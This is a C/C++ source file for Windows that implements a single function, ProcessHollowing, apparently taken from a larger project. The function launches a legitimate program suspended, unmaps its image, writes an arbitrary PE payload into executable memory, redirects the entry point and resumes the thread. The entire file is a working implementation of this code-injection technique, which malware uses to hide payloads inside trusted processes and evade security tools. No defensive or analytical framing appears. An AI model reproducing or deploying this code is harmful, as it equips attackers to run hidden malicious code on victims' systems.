#include "../../include/common.h"

typedef LONG(NTAPI* NtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);

bool ProcessHollowing(const char* targetPath, BYTE* payload, SIZE_T payloadSize) {
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Create suspended process
    if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, 
                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        return false;
    }

    // Get target process context
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // Get image base address
    PVOID pImageBase;
#ifdef _WIN64
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &pImageBase, sizeof(PVOID), NULL);
#else
    ReadProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &pImageBase, sizeof(PVOID), NULL);
#endif

    // Unmap original image
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    NtUnmapViewOfSection pNtUnmapViewOfSection = (NtUnmapViewOfSection)GetProcAddress(hNtdll, "NtUnmapViewOfSection");
    if (pNtUnmapViewOfSection) {
        pNtUnmapViewOfSection(pi.hProcess, pImageBase);
    }

    // Parse PE headers of payload
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)payload;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)(payload + pDosHeader->e_lfanew);

    // Allocate memory in target
    PVOID pRemoteImage = VirtualAllocEx(pi.hProcess, 
        (PVOID)pNtHeaders->OptionalHeader.ImageBase,
        pNtHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if (!pRemoteImage) {
        // Try any address
        pRemoteImage = VirtualAllocEx(pi.hProcess, NULL,
            pNtHeaders->OptionalHeader.SizeOfImage,
            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!pRemoteImage) {
        TerminateProcess(pi.hProcess, 0);
        return false;
    }

    // Write headers
    WriteProcessMemory(pi.hProcess, pRemoteImage, payload, 
        pNtHeaders->OptionalHeader.SizeOfHeaders, NULL);

    // Write sections
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        WriteProcessMemory(pi.hProcess,
            (PVOID)((LPBYTE)pRemoteImage + pSection[i].VirtualAddress),
            (PVOID)(payload + pSection[i].PointerToRawData),
            pSection[i].SizeOfRawData, NULL);
    }

    // Update entry point
#ifdef _WIN64
    ctx.Rcx = (DWORD64)((LPBYTE)pRemoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Rdx + 0x10), &pRemoteImage, sizeof(PVOID), NULL);
#else
    ctx.Eax = (DWORD)((LPBYTE)pRemoteImage + pNtHeaders->OptionalHeader.AddressOfEntryPoint);
    WriteProcessMemory(pi.hProcess, (PVOID)(ctx.Ebx + 8), &pRemoteImage, sizeof(PVOID), NULL);
#endif

    // Resume thread
    SetThreadContext(pi.hThread, &ctx);
    ResumeThread(pi.hThread);

    return true;
}